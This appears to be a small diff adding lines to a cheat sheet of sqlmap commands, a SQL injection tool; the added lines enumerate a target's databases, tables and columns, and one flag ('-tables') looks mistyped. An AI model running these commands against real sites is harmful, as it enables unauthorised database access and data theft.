@@ -4,4 +4,7 @@ sqlmap.py -u url --crawl 2 --batch
 sqlmap.py -u url --crawl 2 --technique="U"
 sqlmap.py -u url --crawl 2 --batch --threads 5
 sqlmap.py -u url --crawl 2 --batch --risk 1
+sqlmap.py -u url --dbs
+sqlmap.py -u url -D dbs -tables
+sqlmap.py -u url -D dbs -T tables --columns
 
